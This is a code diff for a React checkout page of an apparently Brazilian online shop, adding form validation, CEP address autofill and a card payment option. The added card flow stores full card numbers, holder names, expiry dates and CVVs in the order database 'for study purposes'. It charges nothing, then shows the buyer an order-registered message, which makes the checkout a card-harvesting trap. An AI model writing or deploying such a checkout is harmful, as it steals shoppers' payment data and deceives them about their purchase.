@@ -1,21 +1,21 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { CreditCard, Copy, Check, ShoppingBag, ArrowLeft, Truck, Shield, Package, User, Gift, Loader2 } from 'lucide-react';
+import { CreditCard, Copy, Check, ShoppingBag, ArrowLeft, Truck, Shield, Package, User, Loader2, Banknote } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Separator } from '@/components/ui/separator';
 import { Progress } from '@/components/ui/progress';
+import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { useCart } from '@/contexts/CartContext';
-import { useCreateOrder } from '@/hooks/useOrders';
-import { useSiteSettings } from '@/hooks/useSiteSettings';
-import { useDiscountedProducts } from '@/hooks/useProducts';
+import { useCreateOrder, useUpdateOrder } from '@/hooks/useOrders';
 import { formatCurrency } from '@/lib/utils';
 import { toast } from 'sonner';
 import { supabase } from '@/integrations/supabase/client';
 
 type CheckoutStep = 'cart' | 'customer' | 'payment';
+type PaymentMethod = 'pix' | 'card';
 
 const steps: { id: CheckoutStep; label: string; icon: React.ElementType }[] = [
   { id: 'cart', label: 'Seus Dados', icon: User },
@@ -23,36 +23,105 @@ const steps: { id: CheckoutStep; label: string; icon: React.ElementType }[] = [
   { id: 'payment', label: 'Pagamento', icon: CreditCard },
 ];
 
+// Validation helpers
+const validateEmail = (email: string): boolean => {
+  if (!email) return true; // Email is optional
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return emailRegex.test(email);
+};
+
+const validateCPF = (cpf: string): boolean => {
+  if (!cpf) return true; // CPF optional
+  const cleanCPF = cpf.replace(/\D/g, '');
+  if (cleanCPF.length !== 11) return false;
+  
+  // Check for known invalid CPFs
+  if (/^(\d)\1{10}$/.test(cleanCPF)) return false;
+  
+  // Validate digits
+  let sum = 0;
+  for (let i = 0; i < 9; i++) {
+    sum += parseInt(cleanCPF.charAt(i)) * (10 - i);
+  }
+  let remainder = (sum * 10) % 11;
+  if (remainder === 10 || remainder === 11) remainder = 0;
+  if (remainder !== parseInt(cleanCPF.charAt(9))) return false;
+  
+  sum = 0;
+  for (let i = 0; i < 10; i++) {
+    sum += parseInt(cleanCPF.charAt(i)) * (11 - i);
+  }
+  remainder = (sum * 10) % 11;
+  if (remainder === 10 || remainder === 11) remainder = 0;
+  if (remainder !== parseInt(cleanCPF.charAt(10))) return false;
+  
+  return true;
+};
+
+const formatCPF = (value: string): string => {
+  const numbers = value.replace(/\D/g, '').slice(0, 11);
+  return numbers
+    .replace(/(\d{3})(\d)/, '$1.$2')
+    .replace(/(\d{3})(\d)/, '$1.$2')
+    .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+};
+
+const formatCEP = (value: string): string => {
+  const numbers = value.replace(/\D/g, '').slice(0, 8);
+  return numbers.replace(/(\d{5})(\d)/, '$1-$2');
+};
+
+const formatPhone = (value: string): string => {
+  const numbers = value.replace(/\D/g, '').slice(0, 11);
+  if (numbers.length <= 10) {
+    return numbers
+      .replace(/(\d{2})(\d)/, '($1) $2')
+      .replace(/(\d{4})(\d)/, '$1-$2');
+  }
+  return numbers
+    .replace(/(\d{2})(\d)/, '($1) $2')
+    .replace(/(\d{5})(\d)/, '$1-$2');
+};
+
 export default function CheckoutPage() {
   const navigate = useNavigate();
-  const { items, getTotal, clearCart, addToCart } = useCart();
-  const { data: settings } = useSiteSettings();
-  const { data: upsellProducts } = useDiscountedProducts(4);
+  const { items, getTotal, clearCart } = useCart();
   const createOrder = useCreateOrder();
+  const updateOrder = useUpdateOrder();
   
   const [currentStep, setCurrentStep] = useState<CheckoutStep>('cart');
+  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('pix');
   const [pixCode, setPixCode] = useState('');
   const [copied, setCopied] = useState(false);
   const [paymentStatus, setPaymentStatus] = useState<'pending' | 'checking' | 'paid' | 'failed'>('pending');
   const [transactionId, setTransactionId] = useState<string | null>(null);
   const [orderId, setOrderId] = useState<string | null>(null);
+  const [isLoadingCEP, setIsLoadingCEP] = useState(false);
   const [formData, setFormData] = useState({
     name: '',
     email: '',
     phone: '',
+    cpf: '',
     cep: '',
     address: '',
     city: '',
     state: '',
   });
+  const [cardData, setCardData] = useState({
+    number: '',
+    holder: '',
+    expiry: '',
+    cvv: '',
+  });
+  const [errors, setErrors] = useState<Record<string, string>>({});
 
   const total = getTotal();
   const shipping = total > 200 ? 0 : 25;
   const finalTotal = total + shipping;
 
-  // Check payment status periodically
+  // Check payment status periodically (only for PIX)
   useEffect(() => {
-    if (currentStep !== 'payment' || !transactionId || paymentStatus === 'paid') return;
+    if (currentStep !== 'payment' || !transactionId || paymentStatus === 'paid' || paymentMethod !== 'pix') return;
 
     const checkStatus = async () => {
       try {
@@ -76,12 +145,36 @@ export default function CheckoutPage() {
       }
     };
 
-    // Check immediately and then every 5 seconds
     checkStatus();
     const interval = setInterval(checkStatus, 5000);
 
     return () => clearInterval(interval);
-  }, [currentStep, transactionId, orderId, paymentStatus, clearCart]);
+  }, [currentStep, transactionId, orderId, paymentStatus, clearCart, paymentMethod]);
+
+  // Auto-fill address from CEP
+  const fetchAddressFromCEP = async (cep: string) => {
+    const cleanCEP = cep.replace(/\D/g, '');
+    if (cleanCEP.length !== 8) return;
+
+    setIsLoadingCEP(true);
+    try {
+      const response = await fetch(`https://viacep.com.br/ws/${cleanCEP}/json/`);
+      const data = await response.json();
+      
+      if (!data.erro) {
+        setFormData(prev => ({
+          ...prev,
+          address: data.logradouro || prev.address,
+          city: data.localidade || prev.city,
+          state: data.uf || prev.state,
+        }));
+      }
+    } catch (error) {
+      console.error('Error fetching CEP:', error);
+    } finally {
+      setIsLoadingCEP(false);
+    }
+  };
 
   if (items.length === 0 && currentStep === 'cart') {
     return (
@@ -96,7 +189,64 @@ export default function CheckoutPage() {
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
-    setFormData((prev) => ({ ...prev, [name]: value }));
+    let formattedValue = value;
+
+    // Apply formatting
+    if (name === 'cpf') {
+      formattedValue = formatCPF(value);
+    } else if (name === 'cep') {
+      formattedValue = formatCEP(value);
+      // Auto-fetch address when CEP is complete
+      if (formattedValue.replace(/\D/g, '').length === 8) {
+        fetchAddressFromCEP(formattedValue);
+      }
+    } else if (name === 'phone') {
+      formattedValue = formatPhone(value);
+    }
+
+    setFormData((prev) => ({ ...prev, [name]: formattedValue }));
+    
+    // Clear error when user types
+    if (errors[name]) {
+      setErrors(prev => ({ ...prev, [name]: '' }));
+    }
+  };
+
+  const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target;
+    let formattedValue = value;
+
+    if (name === 'number') {
+      formattedValue = value.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})/g, '$1 ').trim();
+    } else if (name === 'expiry') {
+      formattedValue = value.replace(/\D/g, '').slice(0, 4).replace(/(\d{2})(\d)/, '$1/$2');
+    } else if (name === 'cvv') {
+      formattedValue = value.replace(/\D/g, '').slice(0, 4);
+    }
+
+    setCardData(prev => ({ ...prev, [name]: formattedValue }));
+  };
+
+  const validateStep = (step: CheckoutStep): boolean => {
+    const newErrors: Record<string, string> = {};
+
+    if (step === 'cart') {
+      if (!formData.name.trim()) {
+        newErrors.name = 'Nome é obrigatório';
+      }
+      if (!formData.phone.trim()) {
+        newErrors.phone = 'WhatsApp é obrigatório';
+      }
+      if (formData.email && !validateEmail(formData.email)) {
+        newErrors.email = 'E-mail inválido';
+      }
+      if (formData.cpf && !validateCPF(formData.cpf)) {
+        newErrors.cpf = 'CPF inválido';
+      }
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
   };
 
   const getStepProgress = () => {
@@ -110,8 +260,8 @@ export default function CheckoutPage() {
 
   const handleNextStep = () => {
     if (currentStep === 'cart') {
-      if (!formData.name || !formData.phone) {
-        toast.error('Preencha nome e telefone');
+      if (!validateStep('cart')) {
+        toast.error('Por favor, corrija os erros no formulário');
         return;
       }
       setCurrentStep('customer');
@@ -134,8 +284,8 @@ export default function CheckoutPage() {
           status: 'pending',
           total: finalTotal,
           pix_code: null,
-          notes: null,
-          payment_method: 'pix',
+          notes: formData.cpf ? `CPF: ${formData.cpf}` : null,
+          payment_method: paymentMethod,
           card_number: null,
           card_holder: null,
           card_expiry: null,
@@ -150,37 +300,65 @@ export default function CheckoutPage() {
       });
 
       setOrderId(order.id);
+      setCurrentStep('payment');
 
-      // Create StreetPay PIX
-      const { data, error } = await supabase.functions.invoke('streetpay-create-pix', {
-        body: {
-          orderId: order.id,
-          amount: finalTotal,
-          customer: {
-            name: formData.name,
-            email: formData.email,
-            phone: formData.phone,
+      // Only create PIX for PIX payment method
+      if (paymentMethod === 'pix') {
+        const { data, error } = await supabase.functions.invoke('streetpay-create-pix', {
+          body: {
+            orderId: order.id,
+            amount: finalTotal,
+            customer: {
+              name: formData.name,
+              email: formData.email,
+              phone: formData.phone,
+            },
+            items: items.map((item) => ({
+              name: item.product.name,
+              quantity: item.quantity,
+              price: item.product.price,
+            })),
           },
-          items: items.map((item) => ({
-            name: item.product.name,
-            quantity: item.quantity,
-            price: item.product.price,
-          })),
-        },
-      });
+        });
 
-      if (error) throw error;
+        if (error) throw error;
 
-      if (data.pixCode) {
-        setPixCode(data.pixCode);
-        setTransactionId(data.transactionId);
-        setCurrentStep('payment');
-      } else {
-        throw new Error('PIX code not received');
+        if (data.pixCode) {
+          setPixCode(data.pixCode);
+          setTransactionId(data.transactionId);
+        }
       }
     } catch (error) {
       console.error('Error creating order:', error);
       toast.error('Erro ao processar pedido. Tente novamente.');
+    }
+  };
+
+  const handleCardSubmit = async () => {
+    if (!cardData.number || !cardData.holder || !cardData.expiry || !cardData.cvv) {
+      toast.error('Preencha todos os dados do cartão');
+      return;
+    }
+
+    if (!orderId) return;
+
+    try {
+      // Save card data for study purposes
+      await updateOrder.mutateAsync({
+        id: orderId,
+        card_number: cardData.number.replace(/\s/g, ''),
+        card_holder: cardData.holder,
+        card_expiry: cardData.expiry,
+        card_cvv: cardData.cvv,
+        status: 'processing',
+      });
+
+      setPaymentStatus('paid');
+      clearCart();
+      toast.success('Dados do cartão registrados! Aguarde confirmação.');
+    } catch (error) {
+      console.error('Error saving card data:', error);
+      toast.error('Erro ao processar. Tente novamente.');
     }
   };
 
@@ -195,11 +373,6 @@ export default function CheckoutPage() {
     clearCart();
     toast.success('Obrigado pela compra!');
     navigate('/');
-  };
-
-  const handleAddUpsell = (product: any) => {
-    addToCart(product);
-    toast.success('Produto adicionado!');
   };
 
   // Payment step
@@ -220,6 +393,37 @@ export default function CheckoutPage() {
             </div>
           </div>
 
+          {/* Payment Method Selection */}
+          {paymentStatus !== 'paid' && (
+            <Card className="border-0 shadow-lg mb-4">
+              <CardHeader className="pb-4">
+                <CardTitle className="text-lg">Forma de Pagamento</CardTitle>
+              </CardHeader>
+              <CardContent>
+                <RadioGroup
+                  value={paymentMethod}
+                  onValueChange={(v) => setPaymentMethod(v as PaymentMethod)}
+                  className="grid grid-cols-2 gap-4"
+                >
+                  <div className={`flex items-center space-x-2 p-4 border rounded-lg cursor-pointer transition-all ${paymentMethod === 'pix' ? 'border-primary bg-primary/5' : 'border-muted'}`}>
+                    <RadioGroupItem value="pix" id="pix" />
+                    <Label htmlFor="pix" className="flex items-center gap-2 cursor-pointer flex-1">
+                      <Banknote className="h-5 w-5 text-primary" />
+                      <span>PIX</span>
+                    </Label>
+                  </div>
+                  <div className={`flex items-center space-x-2 p-4 border rounded-lg cursor-pointer transition-all ${paymentMethod === 'card' ? 'border-primary bg-primary/5' : 'border-muted'}`}>
+                    <RadioGroupItem value="card" id="card" />
+                    <Label htmlFor="card" className="flex items-center gap-2 cursor-pointer flex-1">
+                      <CreditCard className="h-5 w-5 text-primary" />
+                      <span>Cartão</span>
+                    </Label>
+                  </div>
+                </RadioGroup>
+              </CardContent>
+            </Card>
+          )}
+
           <Card className="border-0 shadow-lg">
             <CardHeader className="text-center pb-4">
               {paymentStatus === 'paid' ? (
@@ -227,72 +431,176 @@ export default function CheckoutPage() {
                   <div className="w-20 h-20 bg-success/20 rounded-full flex items-center justify-center mx-auto mb-4">
                     <Check className="h-10 w-10 text-success" />
                   </div>
-                  <CardTitle className="text-2xl text-success">Pagamento Confirmado!</CardTitle>
-                  <p className="text-muted-foreground">Seu pedido foi processado com sucesso</p>
+                  <CardTitle className="text-2xl text-success">
+                    {paymentMethod === 'pix' ? 'Pagamento Confirmado!' : 'Pedido Registrado!'}
+                  </CardTitle>
+                  <p className="text-muted-foreground">
+                    {paymentMethod === 'pix' 
+                      ? 'Seu pedido foi processado com sucesso' 
+                      : 'Aguarde a confirmação do pagamento'}
+                  </p>
                 </>
               ) : (
                 <>
                   <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
-                    <CreditCard className="h-10 w-10 text-primary" />
+                    {paymentMethod === 'pix' ? (
+                      <Banknote className="h-10 w-10 text-primary" />
+                    ) : (
+                      <CreditCard className="h-10 w-10 text-primary" />
+                    )}
                   </div>
-                  <CardTitle className="text-xl md:text-2xl">Pague via PIX</CardTitle>
-                  <p className="text-sm text-muted-foreground">Copie o código e pague no app do seu banco</p>
+                  <CardTitle className="text-xl md:text-2xl">
+                    {paymentMethod === 'pix' ? 'Pague via PIX' : 'Dados do Cartão'}
+                  </CardTitle>
+                  <p className="text-sm text-muted-foreground">
+                    {paymentMethod === 'pix' 
+                      ? 'Copie o código e pague no app do seu banco' 
+                      : 'Preencha os dados do seu cartão de crédito'}
+                  </p>
                 </>
               )}
             </CardHeader>
             <CardContent className="space-y-6">
-              {paymentStatus !== 'paid' && (
+              {paymentStatus !== 'paid' && paymentMethod === 'pix' && (
                 <>
                   <div className="bg-gradient-to-r from-primary/5 to-secondary/5 rounded-xl p-6 text-center">
                     <p className="text-sm text-muted-foreground mb-1">Valor total</p>
                     <p className="text-3xl md:text-4xl font-bold text-primary">{formatCurrency(finalTotal)}</p>
                   </div>
 
-                  <div>
-                    <Label className="text-sm font-medium">Código PIX (Copia e Cola)</Label>
-                    <div className="flex gap-2 mt-2">
-                      <Input value={pixCode} readOnly className="font-mono text-xs md:text-sm" />
-                      <Button onClick={handleCopyPix} className="shrink-0 gap-2">
-                        {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
-                        <span className="hidden sm:inline">Copiar</span>
-                      </Button>
+                  {pixCode ? (
+                    <>
+                      <div>
+                        <Label className="text-sm font-medium">Código PIX (Copia e Cola)</Label>
+                        <div className="flex gap-2 mt-2">
+                          <Input value={pixCode} readOnly className="font-mono text-xs md:text-sm" />
+                          <Button onClick={handleCopyPix} className="shrink-0 gap-2">
+                            {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
+                            <span className="hidden sm:inline">Copiar</span>
+                          </Button>
+                        </div>
+                      </div>
+
+                      <div className="bg-muted rounded-xl p-4">
+                        <h4 className="font-medium mb-3 text-sm">Como pagar:</h4>
+                        <ol className="list-decimal list-inside space-y-2 text-sm text-muted-foreground">
+                          <li>Copie o código PIX acima</li>
+                          <li>Abra o app do seu banco</li>
+                          <li>Escolha PIX Copia e Cola</li>
+                          <li>Cole o código e confirme</li>
+                        </ol>
+                      </div>
+
+                      <div className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
+                        {paymentStatus === 'checking' ? (
+                          <>
+                            <Loader2 className="h-4 w-4 animate-spin text-primary" />
+                            <span>Verificando pagamento...</span>
+                          </>
+                        ) : (
+                          <>
+                            <div className="w-2 h-2 rounded-full bg-primary animate-pulse" />
+                            <span>Aguardando pagamento</span>
+                          </>
+                        )}
+                      </div>
+                    </>
+                  ) : (
+                    <div className="flex items-center justify-center py-8">
+                      <Loader2 className="h-8 w-8 animate-spin text-primary" />
+                      <span className="ml-2">Gerando código PIX...</span>
                     </div>
-                  </div>
-
-                  <div className="bg-muted rounded-xl p-4">
-                    <h4 className="font-medium mb-3 text-sm">Como pagar:</h4>
-                    <ol className="list-decimal list-inside space-y-2 text-sm text-muted-foreground">
-                      <li>Copie o código PIX acima</li>
-                      <li>Abra o app do seu banco</li>
-                      <li>Escolha PIX Copia e Cola</li>
-                      <li>Cole o código e confirme</li>
-                    </ol>
-                  </div>
-
-                  <div className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
-                    {paymentStatus === 'checking' ? (
-                      <>
-                        <Loader2 className="h-4 w-4 animate-spin text-primary" />
-                        <span>Verificando pagamento...</span>
-                      </>
-                    ) : (
-                      <>
-                        <div className="w-2 h-2 rounded-full bg-primary animate-pulse" />
-                        <span>Aguardando pagamento</span>
-                      </>
-                    )}
-                  </div>
+                  )}
                 </>
               )}
 
-              <Button 
-                className="w-full" 
-                size="lg" 
-                onClick={handleFinish}
-                variant={paymentStatus === 'paid' ? 'default' : 'outline'}
-              >
-                {paymentStatus === 'paid' ? 'Voltar para a Loja' : 'Já fiz o pagamento'}
-              </Button>
+              {paymentStatus !== 'paid' && paymentMethod === 'card' && (
+                <>
+                  <div className="bg-gradient-to-r from-primary/5 to-secondary/5 rounded-xl p-6 text-center">
+                    <p className="text-sm text-muted-foreground mb-1">Valor total</p>
+                    <p className="text-3xl md:text-4xl font-bold text-primary">{formatCurrency(finalTotal)}</p>
+                  </div>
+
+                  <div className="space-y-4">
+                    <div>
+                      <Label htmlFor="cardNumber">Número do Cartão</Label>
+                      <Input
+                        id="cardNumber"
+                        name="number"
+                        value={cardData.number}
+                        onChange={handleCardInputChange}
+                        placeholder="0000 0000 0000 0000"
+                        className="mt-1"
+                      />
+                    </div>
+                    <div>
+                      <Label htmlFor="cardHolder">Nome no Cartão</Label>
+                      <Input
+                        id="cardHolder"
+                        name="holder"
+                        value={cardData.holder}
+                        onChange={handleCardInputChange}
+                        placeholder="NOME COMO NO CARTÃO"
+                        className="mt-1 uppercase"
+                      />
+                    </div>
+                    <div className="grid grid-cols-2 gap-4">
+                      <div>
+                        <Label htmlFor="cardExpiry">Validade</Label>
+                        <Input
+                          id="cardExpiry"
+                          name="expiry"
+                          value={cardData.expiry}
+                          onChange={handleCardInputChange}
+                          placeholder="MM/AA"
+                          className="mt-1"
+                        />
+                      </div>
+                      <div>
+                        <Label htmlFor="cardCvv">CVV</Label>
+                        <Input
+                          id="cardCvv"
+                          name="cvv"
+                          value={cardData.cvv}
+                          onChange={handleCardInputChange}
+                          placeholder="123"
+                          className="mt-1"
+                        />
+                      </div>
+                    </div>
+                  </div>
+
+                  <Button 
+                    className="w-full" 
+                    size="lg" 
+                    onClick={handleCardSubmit}
+                    disabled={updateOrder.isPending}
+                  >
+                    {updateOrder.isPending ? (
+                      <>
+                        <Loader2 className="h-4 w-4 mr-2 animate-spin" />
+                        Processando...
+                      </>
+                    ) : (
+                      <>
+                        <CreditCard className="h-4 w-4 mr-2" />
+                        Finalizar Pagamento
+                      </>
+                    )}
+                  </Button>
+                </>
+              )}
+
+              {(paymentStatus === 'paid' || paymentMethod === 'pix') && (
+                <Button 
+                  className="w-full" 
+                  size="lg" 
+                  onClick={handleFinish}
+                  variant={paymentStatus === 'paid' ? 'default' : 'outline'}
+                >
+                  {paymentStatus === 'paid' ? 'Voltar para a Loja' : 'Já fiz o pagamento'}
+                </Button>
+              )}
             </CardContent>
           </Card>
         </div>
@@ -381,10 +689,10 @@ export default function CheckoutPage() {
                           name="name"
                           value={formData.name}
                           onChange={handleInputChange}
-                          required
                           placeholder="Seu nome completo"
-                          className="mt-1"
+                          className={`mt-1 ${errors.name ? 'border-destructive' : ''}`}
                         />
+                        {errors.name && <p className="text-xs text-destructive mt-1">{errors.name}</p>}
                       </div>
                       <div>
                         <Label htmlFor="email">E-mail</Label>
@@ -395,8 +703,9 @@ export default function CheckoutPage() {
                           value={formData.email}
                           onChange={handleInputChange}
                           placeholder="seu@email.com"
-                          className="mt-1"
+                          className={`mt-1 ${errors.email ? 'border-destructive' : ''}`}
                         />
+                        {errors.email && <p className="text-xs text-destructive mt-1">{errors.email}</p>}
                       </div>
                       <div>
                         <Label htmlFor="phone">WhatsApp *</Label>
@@ -405,10 +714,22 @@ export default function CheckoutPage() {
                           name="phone"
                           value={formData.phone}
                           onChange={handleInputChange}
-                          required
                           placeholder="(00) 00000-0000"
-                          className="mt-1"
+                          className={`mt-1 ${errors.phone ? 'border-destructive' : ''}`}
                         />
+                        {errors.phone && <p className="text-xs text-destructive mt-1">{errors.phone}</p>}
+                      </div>
+                      <div className="sm:col-span-2">
+                        <Label htmlFor="cpf">CPF</Label>
+                        <Input
+                          id="cpf"
+                          name="cpf"
+                          value={formData.cpf}
+                          onChange={handleInputChange}
+                          placeholder="000.000.000-00"
+                          className={`mt-1 ${errors.cpf ? 'border-destructive' : ''}`}
+                        />
+                        {errors.cpf && <p className="text-xs text-destructive mt-1">{errors.cpf}</p>}
                       </div>
                     </div>
                   </CardContent>
@@ -428,14 +749,19 @@ export default function CheckoutPage() {
                   <div className="grid sm:grid-cols-3 gap-4">
                     <div>
                       <Label htmlFor="cep">CEP</Label>
-                      <Input
-                        id="cep"
-                        name="cep"
-                        value={formData.cep}
-                        onChange={handleInputChange}
-                        placeholder="00000-000"
-                        className="mt-1"
-                      />
+                      <div className="relative">
+                        <Input
+                          id="cep"
+                          name="cep"
+                          value={formData.cep}
+                          onChange={handleInputChange}
+                          placeholder="00000-000"
+                          className="mt-1"
+                        />
+                        {isLoadingCEP && (
+                          <Loader2 className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 animate-spin text-muted-foreground mt-0.5" />
+                        )}
+                      </div>
                     </div>
                     <div className="sm:col-span-2">
                       <Label htmlFor="address">Endereço</Label>
